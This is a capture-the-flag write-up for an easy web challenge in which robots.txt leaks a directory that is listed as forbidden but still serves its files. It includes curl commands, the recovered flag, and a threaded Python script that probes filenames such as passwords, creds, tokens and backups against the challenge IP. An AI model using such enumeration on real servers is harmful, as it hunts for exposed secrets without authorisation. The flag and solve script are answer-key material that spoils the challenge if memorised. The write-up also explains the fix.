---
title: "Quick Recovery"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: easy
points: 150
flag_format: "safctf{...}"
author: "Strawhats"
---

# Quick Recovery

> **Category:** WEB · **Points:** 150 · **Difficulty:** easy

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Target:** http://54.72.82.22:8010

## Observations

Apache/2.4.68 (Debian), "AFTERHOURS" music-festival theme. Recon found:

- `/robots.txt` — 200, and it leaks a path:

  ```
  User-agent: *
  Disallow: /IKnewYouWouldFindThis/
  # Legacy recovery records use their original file paths.
  ```

- `/IKnewYouWouldFindThis/` — **403**, directory listing disabled (`Options -Indexes`).
- `/login.html` — a decoy: the form is wired to `onsubmit="fakeLogin(event)"`,
  which just calls `alert("Sign-in was unsuccessful...")`. No backend at all.

The robots comment is the whole hint: the records live under that path *using
their original file paths* — i.e. the filenames are the original ones, and a
403 on the directory does not protect the files inside it.

## Exploit

Enumerate filenames inside the 403 directory. The listing is blocked, but the
files themselves are served:

```sh
curl http://54.72.82.22:8010/IKnewYouWouldFindThis/flag.txt
# safctf{69f779b5b18bad69606f1926395e7c2a}

curl http://54.72.82.22:8010/IKnewYouWouldFindThis/flag.php
# safctf{69f779b5b18bad69606f1926395e7c2a}
```

474 candidate names were probed; `flag.txt` and `flag.php` both return 200 with
the flag. Everything else is 404.

## Root cause / fix

Sensitive records are staged in a web-served directory that relies on
`Options -Indexes` for confidentiality. Directory listing is a discoverability
control, not an access control — the files remain directly fetchable. Fix: move
recovery records outside the document root (or behind authentication), so
knowing the filename is not sufficient to read it.

## Reproduction

```sh
.venv/bin/python chal/web/quick-recovery/solve.py
```

## Solve script

`web/quick-recovery/solve.py`:

```python
#!/usr/bin/env python3
"""Quick Recovery — safctf

robots.txt leaks /IKnewYouWouldFindThis/ (403, listing disabled). The files
inside are still served directly, so a filename probe finds the flag.

    python3 solve.py
"""
import itertools
from concurrent.futures import ThreadPoolExecutor

import requests

requests.packages.urllib3.disable_warnings()

BASE = "http://54.72.82.22:8010"
DIR = "/IKnewYouWouldFindThis/"

NAMES = [
    "index", "records", "recovery", "record", "log", "logs", "access", "users",
    "user", "admin", "passwords", "password", "backup", "bak", "old", "notes",
    "note", "maintenance", "maint", "flag", "secret", "data", "db", "sql",
    "config", "conf", "readme", "list", "export", "dump", "archive", "history",
    "audit", "recover", "reset", "token", "tokens", "keys", "creds",
]
EXTS = ["", ".txt", ".html", ".htm", ".php", ".bak", ".old", ".json", ".log",
        ".md", ".sql", ".zip"]


def main() -> None:
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"
    candidates = [DIR + n + e for n, e in itertools.product(NAMES, EXTS)]

    def probe(path: str):
        try:
            r = session.get(BASE + path, timeout=8, allow_redirects=False)
        except requests.RequestException:
            return None
        if r.status_code == 200 and "safctf{" in r.text:
            return path, r.text.strip()
        return None

    with ThreadPoolExecutor(max_workers=24) as ex:
        for hit in ex.map(probe, candidates):
            if hit:
                print(f"{hit[0]} -> {hit[1]}")


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- `itertools`
- Python `requests` (HTTP client)
- Python 3 (solver)
- curl

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{69f779b5b18bad69606f1926395e7c2a}
```
